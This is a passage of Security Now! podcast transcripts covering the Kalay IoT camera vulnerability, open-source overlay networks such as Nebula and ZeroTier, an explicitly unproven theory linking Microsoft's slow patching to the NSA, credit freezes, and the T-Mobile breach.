With the compromised credentials, an attacker could use the Kalay network to remotely connect to the original device, access audio-visual data, and execute remote procedure calls against the device.  Vulnerabilities which exist within the device-implemented RPC interface can lead to fully remote and complete device compromise.  Mandiant observed that the binaries on the IoT devices processing Kalay data typically ran as the privileged user root and lacked common binary protections such as Address Space Layout Randomization (ASLR), Platform Independent Execution (PIE), stack canaries, and no-execute bits.  Anyway, they provide additional details.  They then post a video which demonstrates a functional proof-of-concept for this exploit, CVE-2021-28372.  And they note that they will not be releasing any public exploit code.



They conclude by explaining:  "CVE-2021-28372 poses a huge risk to an end user's security and privacy and should be mitigated appropriately.  Unfortunately, nobody knows if they have the risk because nobody knows if their things are using this Kalay network.  Unprotected devices, such as IoT cameras, can be compromised remotely with access to a UID, and further attacks are possible depending on the functionality exposed by a device."  And as I've said, these things are typically connecting.  We don't know where.  Maybe back to China.  So now we have the ability to remotely reprogram the firmware on 83 million compromisable devices.



You know, I get it that doing all that reverse engineering is their job, and that it presents an engaging challenge.  But it is a big problem, as I noted before, that on the one hand a company like ThroughTek can produce and sell, I mean, is allowed to produce and sell under license an arbitrary protocol and SDK that is closed and proprietary and has undergone no external third-party security verification; and also that, on the other hand, the IoT vendors will purchase licenses to this sort of closed and proprietary technology.  I mean, the damage that is pending out there is astonishing.  It's become a theme of the podcast because it has to.



The Mandiant researchers listed a bunch of things that need to be done to tighten up the security of the system.  ThroughTek has responded.  But those 83 million webcams and baby monitors already sold likely won't be getting their firmware updated because it doesn't have to happen.  It didn't have to happen that anyone made sure this stuff was secure in the first place.  What makes us think that aftermarket sales are going to update baby monitors?  Like I said, no one wants that crap sharing the same network as their PCs.  When the IoT chickens come home to roost, you want to be a spectator and not a victim.



LEO:  That's quite an image you just threw in my head.



STEVE:  Okay.  Something cool for our listeners:  Overlay Networks.  It's clear from the rave reactions from all of those who took Tailscale out for a spin and adopted it easily within minutes, that the era of overlay networks is upon us.  The first popular mainstream overlay network that we talked about was one that this podcast helped put on the map.  That of course was Hamachi.  And I loved it because back in the pre-IPv4 exhaustion days, it very cleverly used the unallocated and never before used Class A five-dot network for its overlay endpoint numbering.  It was an overlay network.  It ran over existing routable IP and created a virtual network whose IPs started with five dot something something something.  Another emerging term we're going to be seeing is the notion of so-called "Software Defined Networks," so SDNs, or sometimes SD-WANs, Software Defined Wide Area Networks.



Okay.  So Tailscale.com was the first one we talked about, and they appear to have nailed a solution to this need.  As we've seen, their free tier for personal use has been hugely popular among our listeners.  But for the sake of completeness, and because some people will prefer totally open solutions without any commercial component, I wanted to bring three other very similar offerings to everyone's attention.



Okay.  Nebula.  Nebula is a full, open and open source scalable overlay networking tool developed by Slack.  Slack runs on Nebula.  It focuses upon performance, simplicity, and security to enable its users to seamlessly connect computers anywhere in the world.  Nebula is portable.  It runs on Linux, OS X, Windows, iOS, and Android.  It can be used to connect a small number of computers, but it's equally able to connect tens of thousands of computers.  And as I said, Nebula is what Slack runs on.  It incorporates a number of existing concepts like encryption, security groups, certificates, and tunneling.  Nebula didn't invent any of those individual pieces, obviously.  They all existed before Nebula in various forms.  What makes Nebula different from existing offerings is that it brings all of these ideas together, resulting in a sum, as they put it, that is greater than its individual parts.



Slack rhetorically asked:  "What's the easiest way to securely connect tens of thousands of computers, hosted at multiple cloud service providers, in dozens of locations around the globe?"  That was the problem they had.  Slack's answer is Nebula.  They wrote:  "At Slack, we asked ourselves this very question a few years ago.  We tried a number of approaches to this problem, but each came up with tradeoffs in performance, security, features, or ease of use.  We will gladly share those experiences in future presentations and writing.  But for now, just know that we did not set out to write software to solve this problem.  Slack is in the business of connecting people, not computers."  Anyway, unquote.  What Slack found was that at the time they had no choice other than to build their own solution.



Okay.  So what is Nebula?  Nebula is mutually authenticated, peer-to-peer, software defined network (SDN) based on the Noise Protocol Framework.  I'll explain that in a moment.  Nebula uses certificates to assert a node's IP address, name, and membership within user-defined groups.  Nebula's user-defined groups allow for provider-agnostic traffic filtering among nodes.  Discovery nodes allow individual peers to find each other and optionally use UDP hole punching to establish connections from behind most firewalls and NATs.  Users can move between nodes in any number of cloud service providers, datacenters, and endpoints, without needing - and of course ISPs - without needing to maintain a particular addressing scheme.



Nebula uses elliptic curve Diffie-Hellman key exchange and AES-256-GCM in its default configuration.  And of course those are the same technologies and protocols I chose for SQRL.  Nebula was created to provide a mechanism for groups of hosts to communicate securely, even across the Internet, while enabling expressive firewall definitions similar in style to cloud security groups.



To set up a Nebula network you need, one, the Nebula binaries for your specific platform.  Specifically, you'll need Nebula-cert and the specific Nebula binary for each platform you use.  And, two, optional, but you really should have at least one discovery node with a routable IP address which Nebula calls a "lighthouse."  Nebula lighthouses allow nodes to find each other anywhere in the world.  A lighthouse is the only node in a Nebula network whose IP should not change.



Running a lighthouse requires very few compute resources, and you can easily use the least expensive option from a cloud hosting provider.  If you're not sure which provider to use, Slack wrote that a number of them, that is, a number of the people within Slack have used the $5 a month DigitalOcean droplets as lighthouses.  Once a Nebula instance has been launched, ensure that Nebula UDP traffic - the default port is UDP 4242 - can reach it over the Internet, and you're good to go.  That's it.



Okay.  So of some concern is, wait a minute, the Noise Protocol Framework?  Well, they did that right, too.  We never talked about that before.  The Noise Protocol Framework is at NoiseProtocol.org.  The Noise Protocol Framework describes itself:  "Noise is a framework for building crypto protocols.  Noise protocols support mutual and optional authentication, identity hiding, forward secrecy, zero round-trip encryption, and other advanced features."  Right?  All things we want.  Open source implementations are available in C, C#, Go, Haskell, Java, Javascript, Python, and Rust.



And now here it is.  Noise is currently used by WhatsApp and WireGuard and others.  In other words, rather than building a solution on top of WireGuard, as some of the other software-defined overlay networks have, essentially creating a dynamic configuration manager for WireGuard  which is an entirely acceptable solution, by the way  Nebula drops down to a lower level to use the same Noise Protocol Framework upon which WireGuard was built.  So there is no separate instance of WireGuard, and Nebula incorporates the features and benefits provided by WireGuard by virtue of being based upon the same shared framework.



Okay.  That's Nebula.  Another open source open solution is known as Innernet, is built upon WireGuard but, unlike Tailscale, open and open source.  The Innernet developers explain:  "Innernet is similar in its goals to Slack's Nebula or Tailscale, but takes a bit of a different approach.  It aims to take advantage of existing networking concepts like CIDRs - classless inter-domain routing - and the security properties of WireGuard to turn your computer's basic IP networking into more powerful ACL (access control) primitives.  This allows you to nurture and shape your own private networks with simple, free, open-source infrastructure."  And they're hosted on GitHub, as is Nebula, by the way.



They said:  "We had some simple goals:  conveniences a typical WireGuard user wants - peer names, auto-updating peer lists, groups based on IP blocks, and automatic NAT hole punching; free, open source, and made to be self-hosted."  They said:  "We think it's especially important for such a vital, low-level piece of our infrastructure to not be dependent on the livelihood of a company no one has control over.  And a straightforward architecture, no Raft consensus here.  It's a simple SQLite server/client model."  So that's Innernet.



And lastly, just for the record, there is another offering known as ZeroTier, T-I-E-R, dot com.  Their slogan is "It Just Works."  ZeroTier combines the capabilities of a VPN and an SD-WAN to simplify network management.  They wrote:  "Enjoy the flexibility while avoiding costly hardware vendor lock-in."  They brag that it has speed.  "Set up ZeroTier in minutes with remote, automated deployment.  Flexibility:  Emulates Layer 2 Ethernet, IP level, with multipath, multicast, and bridging," which is similar to all these.



"ZeroTier's zero-trust networking solution provides scalable security with 256-bit end-to-end encryption," which of course everybody has.  And, they said, it's free for up to 50 endpoints.  So Tailscale was generous with their free plan at a 20-node free limit.  But if that was a little bit binding for someone, you can use ZeroTier - very much like Tailscale, I think, in every way - and go up to 50.  But I know that there'll be lots of people who are interested in the free and open source alternative, so I wanted to share those.



Anyway, in summary, we've got Innernet, looking like a free and open source solution providing much of what Tailscale offers, both of them being built on top of WireGuard to give WireGuard a bunch of needed features.  Nebula is a free and open source SDN written from scratch by the Slack guys because nothing that existed at the time did the job they needed.  And Nebula is built using the same crypto framework as WireGuard, thus inheriting many of the same guarantees as WireGuard, and it also forms the backbone of Slack.  So I would suggest that Nebula has already been proven to be scalable at global scale.  Not that any of us need that for our own personal networks, but it's kind of cool.  So anyway, there's four so-called Software Defined Networks, overlay networks.  And I imagine that one of those will probably appeal to all of our listeners.



Okay.  So two closing-the-loop bits.  Bryan noted in GRC's Security Now! newsgroup, he wrote:  "One thing Steve didn't mention is that in 2016 Avast also purchased AVG for 1.3 billion.  So now Norton gobbled up Avera, Avast, and AVG."  Anyway, I'm glad that Bryan mentioned that.  It happened on our watch in July of 2016.  Avast purchased its fellow Czech cybersecurity company AVG for 1.3 billion, as Bryan noted.  So we are seeing a clear merging and consolidation of the independent security add-on AV companies.  For better or worse, that's happening.



And I received a DM from an individual, so I thought I would share it.  He wrote:  "Can I ask for an advice?  Where do you see the future of IT?  I've been working for the last eight years in different positions mainly in IT infrastructure, network and system.  But now I want to invest my time and plan my future.  Your podcast is a great library for understanding security.  I want to start from the bottom and learn my way up."



And of course given where we are here with this podcast, while I may be somewhat biased, I can't imagine any segment of the IT industry that is safer to invest in for the future than where we are right now with security.  I really believe this is it, that it's not like we're going to solve these problems anytime soon.  There is no reason to believe that we're going to figure out how to do this within anyone who's listening's lifetime.  So, yeah, I would say that an investment in IT security is one that would be long-lasting.



LEO:  As we head into the final quarter of this episode, Steve is going to do a little thought experiment.



STEVE:  Okay.  Not long after we finished recording last week's podcast, which as we all know was titled "Microsoft's Culpable Negligence," I had another thought.  Last week I said over and over, and drove the point home, that given Microsoft's effectively unlimited resources, and having clear knowledge of new highly critical vulnerabilities handed to them, and of the devastating impact the exploitation of those vulnerabilities would have, I was unable to see any rational explanation for Microsoft's behavior, other than that they had to be performing a brutal cost-benefit analysis and rationally deciding not to fix those vulnerabilities, you know, not to take the time to fix them.  One way or another, for one reason or another, this had to be a deliberate decision because there was no way to parse the history that we have all been witness to that wouldn't cause any unbiased observer to conclude that what has been happening was exactly what Microsoft had decided should be happening, insane as that at first appears.



Last week I stated that there could be no other reason.  Then I thought of one.  There is an explanation that perfectly maps onto all of the evidence and exactly predicts the behavior we're all witnessing from Microsoft.  And in this proposed model, the driving motivation is, indeed, a brutal cost-benefit analysis, but one that's even more brutal than we imagined.  It's just not the obvious cost-benefit analysis I was focused upon and described last week.  Last week I was assuming that it would only be hostile and malicious adversaries who would be attacking users of Microsoft's software.  Thus the "cost" in the cost-benefit analysis would be the attacks themselves.  But what if, instead, attacks were the benefits?  And what if those benefits arising from attacks were so beneficial that they outweighed the cost to Microsoft, which we've already determined to be effectively negligible?



So then we have to ask, how could attacks on users of Microsoft's proprietary software be beneficial?  Such attacks would be in the U.S. national interest if they were being conducted by the United States domestic intelligence services against U.S. foreign adversaries.  I recall mentioning on this podcast many years ago that Microsoft routinely tipped off our U.S. intelligence agencies about recently discovered and not-yet-patched flaws in Windows, and in their various other products.  On Security Now! Episode 426, which we recorded on October 16th, 2013, I quoted Bruce Schneier from a piece he wrote for The Atlantic titled "How the NSA Thinks About Secrecy and Risk."  I'm going to read directly, verbatim, the first five paragraphs of that piece, which Bruce wrote nearly eight years ago.



He said:  "As I report in The Guardian today, the NSA has secret servers on the Internet that hack into other computers, codename FOXACID.  These servers provide an excellent demonstration of how the NSA approaches risk management, and exposes flaws in how the agency thinks about the secrecy of its own programs.  Here are the FOXACID basics," Bruce wrote.  "By the time the NSA tricks a target into visiting one of those servers, it already knows exactly who the target is, who wants him eavesdropped on, and the expected value of the data it hopes to receive.  Based on that information, the server can automatically decide what exploit to serve the target, taking into account the risks associated with attacking the target, as well as the benefits of a successful attack.



"According to a top-secret operational procedures manual provided by Edward Snowden, an exploit named Validator might be the default, but the NSA has a variety of options.  The documentation mentions United Rake, Peddle Cheap, Packet Wrench, and Beach Head, all delivered from a FOXACID subsystem called Ferret Cannon."  He says:  "Oh, how I love some of these code names."  Then he says, in parens, "(On the other hand, EGOTISTICALGIRAFFE has to be the dumbest code name ever.)"



He says:  "Snowden explained this to Guardian reporter Glenn Greenwald in Hong Kong.  If the target is a high-value one, FOXACID might run a rare zero-day exploit that it developed or purchased.  If the target is technically sophisticated, FOXACID might decide that there's too much chance for discovery, and keeping the zero-day exploit a secret is more important.  If the target is a low-value one, FOXACID might run an exploit that's less valuable.  If the target is low-value and technically sophisticated, FOXACID might run an already known vulnerability."



And here's the line:  "We know that the NSA receives advance warning from Microsoft of vulnerabilities that will soon be patched."  So he continues:  "There's not much of a loss if an exploit based on that vulnerability is discovered.  FOXACID has tiers of exploits it can run, and uses a complicated trade-off system to determine which one to run against any particular target.  This cost-benefit analysis doesn't end at successful exploitation.  According to Snowden, the TAO" - that's the Tailored Access Operations, of course we were all talking about that eight years ago - "operators running the FOXACID system have a detailed flowchart, with tons of rules about when to stop.  If something doesn't work, stop.  If they detect a PSP, a personal security product, stop.  If anything goes weird, stop.  This is how the NSA avoids detection, and also how it takes mid-level computer operators and turns them into what they call 'cyberwarriors.'  It's not that they're skilled hackers, it's that the procedures do the work for them."



Okay.  So in that fourth paragraph of that longer piece, famous security expert Bruce Schneier said:  "We know that the NSA receives advance warning from Microsoft of vulnerabilities that will soon be patched."  The revelations made by Edward Snowden and WikiLeaks stripped us of our innocence and matured our understanding of the true nature of the global cyber-intelligence world.  Sometimes the need to gather intelligence requires, how shall I put it, an extreme lack of passivity.



So once again I'm being entirely serious about this.  Think about it for a moment.  Microsoft receives notification of a critical vulnerability from any of the world's many white hat hackers who are poking and prodding at their products.  Say they get notice of a horrifically exploitable flaw in their email Exchange Server.  The exploit is not publicly known, and its discoverer has agreed to keep it to themselves until sometime after it has been fixed.



So here's how this proposed timeline would play out.  Microsoft thanks the security researcher hacker and promises to graciously throw them a bone by mentioning their discovery in their eventual disclosure.  Perhaps they'll also receive a bug bounty, but of course only if they remain silent until the problem has been fixed and a sufficient number of systems have been patched.



Next, Microsoft then uses their well-established quiet backchannel to pass the researcher's findings on to the NSA and the CIA.  Microsoft takes no active part in the development of an exploit because that would be crossing a line.  And should it ever become common knowledge that this early information was provided to U.S. intelligence services, Microsoft is simply being a good citizen and helping our own domestic intelligence agencies to guard against attacks which might exploit this now-discovered flaw, yet not publicly disclosed.



And now Microsoft sits on it.  Remember how Victor Mata, who reported a remote code execution vulnerability with full system privileges, tweeted Wednesday before last, on August 11th:  "Hey guys, I reported the vulnerability in December 2020, but haven't disclosed details at MSRC's request.  It looks like they acknowledged it today due to the recent events with print spooler."  So when Microsoft finds themselves in receipt of a valuable vulnerability, do they immediately assign a CVS number?  No.  That would raise suspicion and speculation and might start people looking.  Do they post a note about a new vulnerability that needs fixing and their intention to do so?  Nope.  Not only do they remain completely mum, they do not patch it.  It is only of use to our own, shall we say, "proactive" intelligence agencies who have been informed of it, so long as it remains unknown and unpatched.



All evidence suggests that the reasoning here is that as long as it has not been discovered and publicly reported as being actively exploited in the wild, it's just like any of all those other undiscovered vulnerabilities that exist within Windows, and we all know there's certainly no shortage of those.  In the juicy case of Microsoft's Exchange Server, it's been sitting there, previously undiscovered, for more than the past 10 years.  So what's a few more months?  And just think of all the benefit that our domestic intelligence agencies can reap from it until, and if, it eventually comes to light on its own.  Or perhaps, as Bruce observes, as an unfortunate side effect of its active use by our own NSA or CIA.  What was it that we heard about the Exchange Server exploit?  That it could allow an adversary access to all of the server's local communication history?  Think that might be of interest to some of our snoopier spooks?



And, finally, consider that it wasn't until the ProxyLogon vulnerabilities were suddenly found to be exploited by adversaries actively attacking users of Exchange Server that Microsoft finally jumped to attention and rushed out an emergency fix for the problem.  Remember that they claimed to be getting ready to release the fix with the next Patch Tuesday?  Uh-huh.  And remember that something didn't smell quite right about that at the time?  And then, since this sudden disclosure apparently caught them by surprise, and they were unable to deny how long ago they had been originally been informed about it by our old friend Orange Tsai, they then hinted that someone they told might have leaked the details.  Right.  More like someone they told might have been caught privately exploiting it.



I frequently hear that we have listeners who have been with us from the start, for all of these past 16 years.  And those people will have heard every podcast we've produced, and they will know that they've never heard me once jump onto a conspiracy theory.  That's not the way I roll, and I certainly have no intention of doing so now.  I have no firsthand evidence of this, and I'm not particularly interested in digging up any.  As we all know, I've got much better things to do.  But we also know that absence of proof is not proof of absence.  And any system such as this would be well designed to remain off the books and under the radar.



I've got a chart here in the show notes.  It was made on March 24th, several weeks after Microsoft's emergency patch release for the ProxyLogon flaws.  In it we see, okay, this is two weeks after the patch was made available, on March 24th.  On the chart we see 2,496 still vulnerable Exchange servers in Russia, and 1,473 servers still vulnerable in China.  Again, that's weeks downstream.  I wonder how many Exchange servers in Russia and China might have been vulnerable before Microsoft's revelation?



If nothing else, this resolves the apparent mystery of Microsoft's culpable negligence by converting apparent negligence into reasoned neglect.  I guess the question remains, which would we rather have, a negligent Microsoft or a diabolically neglectful Microsoft?  Neither places the interests of their own customers first.



LEO:  That makes sense.



STEVE:  It does.



LEO:  I mean, you never know, but...



STEVE:  It's sad.



LEO:  ...it makes sense, yeah.  Well, I mean, it's only a possibility.  It's not necessarily what's happening.  But it makes sense.



STEVE:  No, it's not.  But if Bruce is right, and Microsoft is giving tips to the NSA, and the NSA has an interest in actively exploiting, I mean, and being proactive in their intelligence gathering, and I think we must all, given what we learned from Snowden and WikiLeaks, we must all understand that that's the case, I mean, we saw pictures of NSA nodes at central points of the Internet, you know, monitoring all the traffic that went through.  We've seen pictures of the massive server farms next to sources of cold water so they're able to cool themselves.  I mean, you know, this is big business.  So how could they not, I mean, it would almost be malpractice for the NSA not to take advantage while the opportunity is there of the ability to get into remote Exchange servers and use them for gathering intelligence.  How could they not?  And then really, again, what's Microsoft's hurry?  If it's really, really valuable, if it's useful for the U.S., if it's secret, and no one has discovered it in 10 years except one lonely researcher who's promised to keep it quiet with the carrot of a bug bounty once it's disclosed?



LEO:  I don't see why Microsoft would do it.  But okay.



STEVE:  Again, how else do we, you know, last week we explored how could it possibly be that they're not fixing this thing in three months.



LEO:  Right, right.



STEVE:  And then when it's an emergency, they have a fix overnight.  They immediately push out an emergency fix.



LEO:  I think there are other explanations possible, as well, including just a sluggishness.



STEVE:  And not caring.



LEO:  I would hope that Microsoft wouldn't just bend over to the NSA or FBI and the interest of national security over the security of all of its users.  And that seems - certainly we know Apple has said no to the FBI in the past.  That just seems like a pretty craven thing to do.  But maybe they did.  Maybe they did.  It's possible.



STEVE:  Anyway...



LEO:  We don't have any evidence of it, we should point out.



STEVE:  Nope.  No evidence.  I had no explanation for it last week.  It seemed like, you know, how could they just not care to that degree?  Because lord knows they have the resources to fix anything that they're, I mean, it's not - they don't even have to find them.  They're being given these.  How can they not fix it?  I just - you know?  And the only thing I can think is, well, that sure would be handy.  Again, if there were nearly 2,500 still vulnerable Exchange servers operating in Russia two weeks after the patch had been issued, imagine how many there were before.



LEO:  Right.  I also think the NSA is unlikely to speak to a company and say we'd like you not to fix that for a while.  I'm sure they have enough other exploits they could take advantage of.  But maybe.  Maybe.  I'm not saying it's not true.  It's a fascinating theory.



STEVE:  Interesting fodder, if nothing else.



LEO:  Good fodder, absolutely.  Thank you for a great show, as always.  Steve does this every Tuesday, believe it or not.  He's a hard-working fellow.  



STEVE:  Woohoo.



LEO:  You can watch us record the show after MacBreak Weekly.  That's usually around 1:30 to 2:00 p.m. Pacific time, which would be 4:30 to 5:00 Eastern time, or 20:30 UTC.  If you want to watch us live, TWiT.tv/live has a live audio or video stream.  You can chat live with us at irc.twit.tv.  After the fact, Steve's got copies of the show at his website, GRC.com.  He has two unique kinds of versions of the show, a 16Kb audio version for people who really don't want to download anything too big.  There's also an I think probably even smaller text transcription of it.  He also has the 64Kb audio.  That's all at GRC.com.



While you're there, check out SpinRite, Steve's bread and butter, world's best mass storage maintenance and recovery utility, now version 6; 6.1 is on the way.  You can buy it now and get 6.1 for free, plus participate in the development of the next version of SpinRite.  Lots of other great free stuff at GRC.com.  Check it out.  Leave him feedback at GRC.com/feedback.  Or you can tweet him.  His DMs are open, as you heard, @SGgrc.  We have copies of the show, audio and video, 64Kb audio and video, at our website, TWiT.tv/sn.  There's also a Security Now! YouTube channel.



And of course the easiest thing to do is subscribe in a podcast application.  That way you'll get it automatically the minute it's available.



Steve, thank you so much.  Have a great week, and I'll see you next time on Security Now!.



STEVE:  Thanks, buddy.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#834

DATE:		August 31, 2021

TITLE:		Life:  Hanging by a PIN 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-834.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we'll start out by clarifying the terms "credit freeze" and "credit lock."  Then we have news of the T-Mobile breach from its perpetrator.  We examine the evolving and infuriating question of where will Windows 11 run, and we look at yet another newly revealed attack against Microsoft's Exchange Server known as ProxyToken.  I wanted to clarify a bit about Tailscale's source openness, and touch on the disturbing revelations shaking the mass storage industry with SSD performance being deliberately reduced once they've been well reviewed and adopted.  I'll update our patient SpinRite owners on my recent work and progress.  We'll touch on some cellular phone terminology, then conclude by considering the power of the PIN and look at just how much damage it can do.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Lots to talk about.  More details on the T-Mobile breach.  The hacker says, hey, it wasn't that hard.  Steve explains.  He talks about his SpinRite assembly language development tools and secrets.  We'll also talk about the cell phones in our lives and how to make them a little bit more secure.  It's all coming up next on Security Now!.  You won't want to miss this one.	



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 834, recorded Tuesday, August 31st, 2021:  Life:  Hanging by a PIN.



It's time for Security Now!, the show where we cover your security online with this guy right here, Steve Gibson of the Gibson Research Corporation.



STEVE GIBSON:  Hey, Leo.



LEO:  Hey, Steve.



STEVE:  Great to be with you again in our 17th year, last day of August.



LEO:  Oh, my god.



STEVE:  Yes, indeed.  So this is another one of those that just sort of evolved as I was putting my thoughts together.  Today's episode is titled "Life:  Hanging by a PIN."



LEO:  Uh-oh.



STEVE:  And this was sort of a different one because it actually caused me to change some of my behavior.  I changed some configurations of stuff when I really stopped to think about what it means that so much of our security is tied into our cell phones.  So we're going to wind up talking about that; and, actually, a little bit of the crazy acronym soup of IMSI and IMEI and all that other stuff.



LEO:  Oh, good, good.



STEVE:  Yeah, I thought it would be fun to kind of clarify that.  But we're going to start out by clarifying, speaking of clarifying, my mess of the terms surrounding credit bureau locking and freezing which I made last week.



LEO:  You flip-flopped it.



STEVE:  I did really stick my foot it.  But yeah, I recommended the wrong thing.



LEO:  Yeah.



STEVE:  So we're going to fix that.  We've got news of the T-Mobile breach from its perpetrator, we examine the evolving and infuriating question of where will Windows 11 run, and we look at yet another newly revealed attack against Microsoft's Exchange Server known as ProxyToken.  I wanted to clarify a bit about Tailscale's source openness and also touch on this sort of side topic, but the disturbing revelations that are shaking the mass storage industry at the moment with SSD performance being deliberately reduced after new SSDs have been reviewed and adopted.  And it was, Leo, when our favorite SSD manufacturer was caught doing this that I thought, okay, we have to just touch on this.  I want to update our patient SpinRite owners on my recent work in progress, and then conclude by considering the power of the PIN and look at just how much damage it can do.  And of course we've got a great Picture of the Week.  No longer somebody's closet.



LEO:  No more wiring closets, huh?  All right.



STEVE:  It's now someone's box, actually.



LEO:  Oh, okay.  I'm just wondering, we were talking before the show, we were talking on MacBreak Weekly about soldering. 



STEVE:  Yeah.



LEO:  And I was just wondering how long before Instagram recommends a soldering iron to me.  And lo and behold, they already did.  So took no time.  Actually, they recommended a solution instead of soldering.  Says:  "You still soldering?  You should do this."  It's like, wow, I haven't even started, and already...



STEVE:  It is just astonishing.



LEO:  It's kind of amazing.  Kind of amazing.



STEVE:  You know, you could just walk outside and look to the heavens and ask a question.



LEO:  They will know.



STEVE:  And then check your phone.



LEO:  Yeah.  We're getting to that point, yup, yup.  You know, just say it out loud, somebody will respond.  It may be a burning bush.  You don't know.  But somebody will respond.  Now it's time for the Picture of the Week.



STEVE:  Okay.  So we have in this single frame some Greek columns in the background, and a blond woman who's sort of wearing a toga-esque wrap.  And this shows her staring at the screen of her laptop.  I'm not sure how she had a laptop back in Greece.  But the caption is "Pandora's Inbox."  And you see her thinking with a thought bubble:  "It can't hurt to open one little attachment, can it?"



LEO:  Oh, boy.  I love it.



STEVE:  Yes, Pandora's inbox.  Do not open the attachment.  Okay.  So I wanted to begin this week by first and immediately correcting my mistake from last week about the terms "credit freeze" versus "credit lock."  It turns out that the terms matter, and I got them mixed up.  It's a credit freeze that most people will want to use, not a credit lock.  A "freeze" is the  term used by the federally mandated no-cost option which all four major bureaus must provide to prevent queries made from would-be creditors from being honored.



By comparison, the term "lock" is sort of generically but not specifically used to designate an optional product which may take the form of a somewhat costly subscription which may be made available by the various credit reporting agencies with differing features from one company to the next.  So it's that lock product which, for example, has the additional bells and whistles that might be tied to a mobile phone app which the bureau produces to allow for rapid locking and unlocking on the fly.  So I made the mistake of not digging deeply enough into the terminology before talking about it last week.



LEO:  I should have corrected you because I was sitting and doing it while you were talking.  And I did the credit freeze, which thanks to the Economic Growth, Regulatory Relief, and Consumer Protection Act of 2018 is free.



STEVE:  Yes.



LEO:  They used to make money on this.  The credit reporting agencies would charge you for the freeze, and most importantly, charge you to unfreeze.  And those fees ranged from quite a bit of money in some states to free in other states.  But there are no - it's now absolutely free.  And so I put a freeze on all three, and I can unfreeze it.  They give you a PIN.  It's easy to unfreeze.  Of course you'll want to do that before you try to get credit.  I think everybody should just do this.  They don't want you to do it.



STEVE:  Correct.



LEO:  Because they make money selling your information.



STEVE:  Correct.  I think when I did it, because I did lock mine down when I first talked about it, I think I maybe paid like $10 each for then the three major bureaus.



LEO:  Yeah, it's the unfreeze they make money on.



STEVE:  And I did notice that they do have, on the freeze option, they do have a temporary unfreeze.  So anyway, I did want to thank all of our listeners who did know better and who let me know that I'd gotten things somewhat muddled up.



LEO:  The fraud alerts last a year.  Those are the - I think that's what you were talking about.  The fraud alerts don't last.



STEVE:  No, I just didn't appreciate the distinction between "freeze" and "lock."  And so I do now.  Being federally mandated, it costs nothing, as you said.  It also appears that the temporary auto relock is part of the freeze service.  I saw that in several cases.  And that makes it possible to, again, for no charge, to briefly lower one's shields in order to, I mean, like when you know you've got some creditors who are wanting to check your credit.  I also noted some options to temporarily and selectively allow queries to be honored for specific and specified would-be creditors.  So if this begins to sound a bit like you're programming a firewall, that analogy is pretty accurate.  In firewall parlance, rather than the "permit any" rule, we want to run with the "deny all," and then optionally add rules to permit specific creditors to query for and receive reports.



And you may have noted that I mentioned the "four" major credit reporting bureaus before.  A fourth upstart called Innovis has been added to the tradition big three of Experian, Equifax, and TransUnion.  And Leo, you'll want to go there.  It turns out they're big enough to be real.  So everyone will want to place a reporting freeze on their records with Innovis (I-N-N-O-V-I-S), as well as the others, since someone having access to all of your personal data from a data breach might deliberately choose to attempt to obtain credit from some lender who is known to use Innovis specifically because being lesser known they are less likely to have had their reporting frozen.



LEO:  Very good.  So I'm doing that right now.



STEVE:  Innovis, I-N-N-O-V-I-S.  So now it really is the case.  They were bought from something about CBS a few years ago, and they've been growing.  They offer the standard range of services.  And boy, I would like to say, like, no more.  We have to freeze them all.  So stop doing this, folks.  Hopefully there won't be a fifth one who thinks, oh, yeah, there's room in the market for five.  No.  There's no need for any more.  Four is it.



LEO:  It's interesting.  Innovis just gives you a form, you fill it out, and they say, okay, good.  That's it.  You're done.  And then you'll get a confirmation letter by mail.  So I don't know if I'm going to ever worry about unfreezing them.  I think I'll just leave that on.



STEVE:  Yeah.  And in fact you only ever need to unfreeze them if by some chance you were trying to prove your creditworthiness, and the person said, I'm sorry, your credit's locked.  It'd be like, really.  You're using Innovis?  Okay.  And of course then you'd have to unfreeze for them, or tell them to go to one of the original three.  I don't know.



Anyway, T-Mobile.  Thanks to the fact that the attacker, a U.S. citizen, believes that he's currently outside the long arm of U.S. law enforcement, we're now learning quite a lot about the who, what, and why of his quite successful data exfiltration attack on T-Mobile.  And none of what we're learning flatters T-Mobile's cybersecurity.  The Wall Street Journal turns out had been chatting with the purported attacker via Telegram for some time.  They've confirmed that his name is John Binns (B-I-N-N-S).



John is a 21-year-old U.S. citizen of Turkish descent who relocated from the U.S. back to Turkey three years ago.  John was reportedly discussing details of the breach before they were widely known, and T-Mobile received their first indications of trouble when they were notified of the breach by Unit 221B, a cybersecurity company that monitors the dark web for their own purposes.  So they saw that John was offering the sale of all of this data breach material on the dark web, and Unit 221B said, uh, T-Mobile, do you have a problem that you haven't told anybody about?



So John told the Wall Street Journal that his attack against T-Mobile was conducted from the comfort of his home in Izmir, Turkey, where he lives with his mom of Turkish descent.  His American father died when he was just two, and he and his mom moved back to Turkey three years ago when he was 18.  He reportedly uses the online handles IRDev and v0rtex (with a numeric 0), among other handles.  And he's alleged to have an online track record that includes some participation in the creation of a massive botnet that was used for online DDoS attacks four years ago when he was still in the U.S. and 17 years old.



There was some interesting reporting that I didn't put into the show notes because it just sort of seemed murky about him alleging that he was captured and tortured by U.S. agencies and that this attack on T-Mobile was retribution of some sort.  And I thought, okay, well, I'm going to kind of leave all that out of the official notes.  But he did tell the Wall Street Journal that he penetrated T-Mobile's defenses last month, in July, after scanning the company's known IP space, looking for weak spots and using what the Journal referred to as "a simple tool available to the public."  Maybe Shodan.  Who knows?  During his perusal of T-Mobile's public-facing IP space last month, John discovered an exposed and unprotected router, as it has been described.  Again, we don't have much more detail than that.



LEO:  This puzzled me because I'm not sure - I didn't quite understand what - but go ahead.



STEVE:  Yeah.  And the reason it's a little murky is that T-Mobile is pushing back, trying to say, oh, this was a sophisticated attack that required brute forcing across our network.  And John is saying no.



LEO:  Really.



